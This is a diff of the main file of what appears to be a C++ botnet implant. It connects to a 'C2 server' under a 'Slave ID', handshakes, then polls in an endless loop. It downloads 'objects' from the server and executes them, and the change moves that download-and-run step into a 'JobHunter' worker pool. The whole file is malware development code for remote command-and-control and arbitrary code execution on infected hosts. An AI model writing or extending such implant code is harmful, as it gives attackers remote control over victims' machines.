@@ -2,7 +2,7 @@
 
 #include "stdafx.h"
 #include "ConnectionController.h"
-#include "ObjectLoader.h"
+#include "JobHunter.h"
 
 void prepareConnection(ConnectionController* cc) {
 
@@ -24,32 +24,32 @@ void prepareConnection(ConnectionController* cc) {
     cc->prepareConnection(buffer.nodename, username, info);
 }
 
-int newObject(ConnectionController* cc) {
+// int newObject(ConnectionController* cc) {
 
-    ObjectLoader* loader = new ObjectLoader();
+//     ObjectLoader* loader = new ObjectLoader();
     
-    if (!cc->getObject(loader)) {
-        printf("Failed to retrieve object!\n");
-        return RESPONSE_ERROR;
-    }
+//     if (!cc->getObject(loader)) {
+//         printf("Failed to retrieve object!\n");
+//         return RESPONSE_ERROR;
+//     }
 
-    printf("Downloaded the object...\n");
-    if (!loader->parseObject()) {
-        printf("Failed to parse object!\n");
-        return RESPONSE_ERROR;
-    }
+//     printf("Downloaded the object...\n");
+//     if (!loader->parseObject()) {
+//         printf("Failed to parse object!\n");
+//         return RESPONSE_ERROR;
+//     }
 
-    printf("Object parsed, executing now...\n");
-    int retVal = loader->executeObject();
-    int code = cc->finishJob(retVal);
+//     printf("Object parsed, executing now...\n");
+//     int retVal = loader->executeObject();
+//     int code = cc->finishJob(retVal);
 
-    // Cleanup object loader.
-    loader->~ObjectLoader();
-    return code;
-}
+//     // Cleanup object loader.
+//     loader->~ObjectLoader();
+//     return code;
+// }
 
 
-void loop(ConnectionController* cc) {
+void loop(ConnectionController* cc, JobHunter jobHunter) {
 
     for (;;) {
         sleep(5);
@@ -58,9 +58,8 @@ void loop(ConnectionController* cc) {
         switch (responseCode) {
             case RESPONSE_NEW_OBJECT: {
                 
-                int code = newObject(cc); // Load and execute new object.
-                if (code != RESPONSE_LOITER) {
-                    printf("Failed to finish the job!\n");
+                if (!jobHunter.startNewJob(cc)) {
+                    printf("Failed to start the job!\n");
                 }
 
                 break;
@@ -78,6 +77,12 @@ void loop(ConnectionController* cc) {
                 break;
             }
 
+            case RESPONSE_GET_JOBS: {
+
+                jobHunter.getAllJobs(cc);
+                break;
+            }
+
             case RESPONSE_PONG: {
                 printf("PONG!\n");
                 break;
@@ -87,7 +92,9 @@ void loop(ConnectionController* cc) {
                 printf("Error occured! Invalid response from server: %d!\n", responseCode);
                 return;
             }
+
         }
+        jobHunter.getAllJobs(cc); // For debugging.
     }
 
 }
@@ -103,9 +110,14 @@ int main(int argc, char* argv[])
 
     printf("Target C2 server: %s\n", C2HOST);
     printf("Slave ID: %s\n", slaveId);
+
+    // Handles the connections.
     ConnectionController *cc = new ConnectionController(slaveId);
     prepareConnection(cc);
 
+    JobHunter jobHunter; // Worker pool
+
+    // First perform handshake.
     int handshakeCode = 0;
     if ((handshakeCode = cc->handShake()) == RESPONSE_ERROR) {
         printf("Failed to perform handshake for initial connection!\n");
@@ -114,13 +126,13 @@ int main(int argc, char* argv[])
     else if (handshakeCode == RESPONSE_NEW_OBJECT) {
         printf("Getting init object.\n");
 
-        if (!newObject(cc)) {
-            printf("Failed to retrieve init object!\n");
-            return false;
-        } 
+        // If we have an init job.
+        if (!jobHunter.startNewJob(cc)) {
+            printf("Failed to start the job!\n");
+        }
     }
     else {
-        loop(cc);
+        loop(cc, jobHunter); // Forever looper.
     }
 
     return 0;
